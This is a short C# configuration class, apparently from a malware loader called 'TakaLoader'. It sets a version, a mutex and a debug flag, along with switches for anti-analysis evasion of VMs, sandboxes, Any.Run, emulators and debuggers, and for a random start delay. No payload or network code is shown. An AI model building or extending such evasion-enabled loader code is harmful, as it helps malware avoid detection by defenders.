using System.Collections.Generic;

namespace TakaLoader
{
    public static class Config
    {
        public static string Version = "1.2.1";

        // Debug mode (write all exceptions to file)
        public static string DebugMode = "1";

        // Application mutex (random)
        public static string Mutex = "asujdh32";

        // Anti VM, SandBox, Any.Run, Emulator, Debugger, Process
        public static string AntiAnalysis = "1";

        // Random start delay (0-10 seconds)
        public static bool StartDelay = true;
        // Decrypt config values
        public static void Init()
        {
        }
    }
}